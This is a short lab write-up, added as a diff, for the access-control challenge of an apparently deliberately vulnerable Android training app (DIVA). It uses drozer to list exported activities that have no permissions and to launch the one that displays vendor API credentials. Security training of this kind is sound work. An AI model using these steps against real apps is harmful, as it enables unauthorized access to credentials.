@@ -1,0 +1,18 @@
+9. Access Control Issues - Part 1 - Access the API credentials from outside of the App.
+
+Find the Intents via drozer:
+dz>run app.activity.info -a jakhar.aseem.diva
+
+Results:
+Package: jakhar.aseem.diva
+  jakhar.aseem.diva.MainActivity
+    Permission: null
+  jakhar.aseem.diva.APICredsActivity
+    Permission: null
+  jakhar.aseem.diva.APICreds2Activity
+    Permission: null
+
+Run the activities via drozer:
+dz>run app.activity.start --component jakhar.aseem.diva jakhar.aseem.diva.APICredsActivity
+
+Return to mobile phone to see Vendor API Credentials
